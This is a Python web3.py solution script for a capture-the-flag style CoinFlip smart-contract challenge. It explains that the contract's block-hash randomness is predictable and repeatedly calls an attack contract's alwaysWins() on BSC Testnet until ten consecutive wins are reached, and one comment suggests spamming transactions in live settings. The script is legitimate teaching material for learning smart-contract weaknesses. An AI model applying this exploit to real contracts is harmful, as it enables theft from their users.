# The coinflip contract have a frailty on the random number generator. It is not recommended
# to generate random numbers in the blockchain as every source of pseudo randomness can either
# be seen beforehand or be changed by the miners. The coinflip contract uses a past block
# hash to generate the random number. We can calculate that before making our guess in a
# way we will always know the outcome. This can be done in two ways: the first way of 
# doing it is by readgin the block info in our script/backend and constructing the transaction
# using the information. Even though it may work, it is somewhat risky depending of the 
# network block speed, our numbers may change between the transaction creation and the
# transaction sending to the blockchain. A safer approach is to create a smart contract
# and do the calculations on-chain, as you know that the block number won't change inside
# an on-chain transaction. For this solution please refer to the "attack-contracts" folder


# Using web3.py library to make it easier building and signing transactions
# For this solution I had to use BSC Testnet as the hardhat local network was not able 
# to call functions between contracts.

from web3 import Web3, middleware
from web3.middleware import construct_sign_and_send_raw_middleware
from web3.middleware import geth_poa_middleware # Needed for BSC

# Util library to work with private keys and address
from eth_account import Account

# Library to read the JSONs that contains the contract ABI
import json

# Setting up the account to sign transactions. This private key is from the local network
# it is public and not safe to use in a real blockchain
account = Account.from_key("") #TODO: Include operator PK
print(account.address)

# Setting up the provider. For this solution I had to use BSC Testnet
w3Provider = Web3(Web3.HTTPProvider("https://data-seed-prebsc-1-s1.binance.org:8545"))
w3Provider.middleware_onion.inject(geth_poa_middleware, layer=0)
w3Provider.middleware_onion.add(construct_sign_and_send_raw_middleware(account))
w3Provider.eth.default_account = account.address

# Gas strategy is a parameter necessary for BSC Testnet
def gas_price_strategy(web3, transaction_params):
    return Web3.toWei(10, 'gwei')

w3Provider.eth.set_gas_price_strategy(gas_price_strategy)
w3Provider.middleware_onion.add(middleware.time_based_cache_middleware)

# Since this solution uses an attack contract you should set-up the attacking contract
# deployment. I chose to create a separated hardhat instance for that to keep all the 
# original scripts clean, the node and hardhat projects are already created in this folder:

# Getting ABI data from contracts builds and creating the contract object for easier
# contract methods calls. Please note that since this solution uses an attack contract
# you should deploy it first, and the contract address here should be of the attacking 
# contract
buildFile = open('artifacts/contracts/CoinFlip.sol/CoinFlip.json', "r")
build = json.loads(buildFile.read())
victimContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed target address

buildFile = open('artifacts/contracts/CoinFlipAttack.sol/CoinFlipAttack.json', "r")
build = json.loads(buildFile.read())
attackContract = w3Provider.eth.contract(address='', abi=build['abi']) #TODO: Include deployed attack contract address

# With our attacking smart contract set-up we just need to call it until the target of 10,
# is achieved. I warpped it around a try to keep running even on network problems.
# We could do this faster by sending transaction, getting block number until
# it changes and doing it again, but for this exercise we will await for the receipt from
# the last transaction to send the new one. In a live environment, if time is important,
# you should consider spaming transactions until you get the needed count. I do this in 
# most of my wallet recover bots

print(victimContract.functions.consecutiveWins().call())

while (victimContract.functions.consecutiveWins().call() < 10):
    try:
        transaction = attackContract.functions.alwaysWins().transact()
        print(w3Provider.eth.wait_for_transaction_receipt(transaction))
    except:
        continue